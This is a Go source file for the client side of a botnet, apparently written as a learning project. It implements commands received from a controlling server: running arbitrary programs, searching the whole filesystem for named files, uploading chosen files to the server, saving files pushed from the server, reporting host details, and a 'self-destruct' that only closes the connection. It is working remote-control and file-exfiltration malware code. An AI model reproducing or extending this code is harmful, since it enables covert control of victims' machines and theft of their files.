package connection

import (
	"bytes"
	h "client/util/header"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

//*All the commands that the botnet client can run based on parsed commands from server



//* Pings the given address and populates the instruction data
func (c *Client) ping(instr *Command) {
	cmd := exec.Command("ping", instr.Action)
	output, err := cmd.CombinedOutput()

	if err != nil {
		fmt.Println(h.E, "Error executing ping command:", err)
		instr.Response.Data = nil
		instr.Response.Result = false
		return
	}

	instr.Response.Data = output
	instr.Response.Result = true
}

//* Runs the file on client given from server
func (c *Client) run(instr *Command) {
	cmd := exec.Command(instr.Action)

	resultChan := make(chan *Response)
	
	var stdoutBuf bytes.Buffer
	cmd.Stdout = &stdoutBuf

	
	go func() {
		cmdResult := &Response{}
		err := cmd.Run()

		if err != nil {
			fmt.Println(h.E, "Error running app:", err)
			cmdResult.Data = nil
			cmdResult.Result = false
		} else {
			if !isExecutable(instr.Action){
				cmdResult.Data = []byte(" " + instr.Action + " is running on client")
				cmdResult.Result = true
			}else{
				cmdResult.Data = []byte(" " + instr.Action + " is running on client stdout== " + stdoutBuf.String())
				cmdResult.Result = true
			}
			
		}
		resultChan <- cmdResult
	}()

	cmdResult := <-resultChan

	instr.Response.Data = cmdResult.Data
	instr.Response.Result = cmdResult.Result
}


//* Searches for file on client and sends path to server
func (c *Client) searchFile(instr *Command) {
	if byteSlice, err := search(instr.Action); err != nil{
		instr.Response.Data = nil
		instr.Response.Result = false
	}else{
		instr.Response.Data = byteSlice
		instr.Response.Result = true
	}
}

//* Searches for a file (f)
func search(f string) ([]byte, error){
	var files []string

	root := "/"
	// root := "G:/Documents/GitHub/botnet-learn/botnet/server/"

	err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			if os.IsNotExist(err) || os.IsPermission(err) {
				return nil
			}
			fmt.Println(h.E, "Error finding file(s)", err)
			return err 
		}

		if !info.IsDir() && filepath.Base(path) == f {
			files = append(files, path)
		}
		return nil
	})

	if err != nil {
		fmt.Println(h.E, "Error:", err)
		return nil, err
	}

	delimiter := " "
	singleString := strings.Join(files, delimiter)
	return []byte(singleString), nil
}




//* Sends where the PWD is of the client to the server
func (c *Client) entryPoint(instr *Command) {
	dir, err := os.Getwd()
	
	if err != nil {
		fmt.Println("Error getting current directory:", err)
		instr.Response.Data = nil
		instr.Response.Result = false
		return
	}

	instr.Response.Data = []byte(dir)
	instr.Response.Result = true
}


//*Closes the connection (and deletes exe) of client
func (c *Client) selfDestruct(instr *Command) {
	instr.Response.Data = []byte("Self Destructing....")
	instr.Response.Result = true
	c.sendResponse(instr)
	c.Conn.Close()
}

//*Sends the current properties of the client to server
func (c *Client) sendMetadata(intr *Command) {
	metadata := fmt.Sprintf(" ID:%d OS:%s CONN:%s", c.ID, c.OS, c.Conn.LocalAddr().String())
	intr.Response.Data = []byte(metadata)
	intr.Response.Result = true
}



//* Receives file from server and saves it to client
func (c *Client) ReceiveFileFromServer(instr *Command) {
	file, err := os.Create(filepath.Base(instr.FileInfo.Name))
		
	if err != nil {
		fmt.Println(h.E, "ERROR:", err)
		instr.Response.Data = nil
		instr.Response.Result = false
		return
	}

	_, err = io.CopyN(file, c.Conn, instr.FileInfo.Size)
	
	if err != nil {
		fmt.Println(h.E, "ERROR:", err)
		instr.Response.Data = nil
		instr.Response.Result = false
	} else {
		fmt.Println(h.K, "File saved")
		path, err := filepath.Abs(file.Name())
		if err != nil{
			instr.Response.Data = []byte(" File Saved to Client")
			instr.Response.Result = true
		}else{
			instr.Response.Data = []byte(" File Saved to Client @" + path)
			instr.Response.Result = true
		}
	}	
	file.Close()
}


//* sends a file from client to the server to download
func (c *Client) sendToServer(instr *Command) {
	file, err := os.Open(instr.Action)
	if err != nil{
		fmt.Println(h.E, "Error opening file")
		instr.Response.Data = nil
		instr.Response.Result = false
		return
	}
	
	defer file.Close()

	fileStats, err := os.Stat(filepath.Base(instr.Action))
	if err !=nil{
		fmt.Println(h.E, "Error getting stats")
		instr.Response.Data = nil
		instr.Response.Result = false
		return
	}

	retData := fmt.Sprintf("DOWNLOADINFO %d %s", fileStats.Size(), filepath.Base(instr.Action))
	c.Conn.Write([]byte(retData))

	if _, err = io.CopyN(c.Conn, file, fileStats.Size()); err != nil {
		fmt.Println(h.E, "Error copying file")
		instr.Response.Data = nil
		instr.Response.Result = false
		return
	}
	instr.Response.Result = true
	instr.Response.Data = []byte(" Download Successful")
}





//*Sends the response of the client to the server
func (c *Client) sendResponse(instr *Command) {
	if !instr.Response.Result {
		fmt.Println(h.E,"response no good")

		_, err := c.Conn.Write([]byte(" EXECUTION FAILED"))
	
		if err != nil {
			fmt.Println(h.E, "Error sending data:", err)
			return
		}
		return
	}

	if _, err := c.Conn.Write([]byte(instr.Response.Data)); err != nil {
	    fmt.Println(h.E, "Error sending data:", err)
	    return
	}
	
	fmt.Println(h.K, "Response sent to server")
}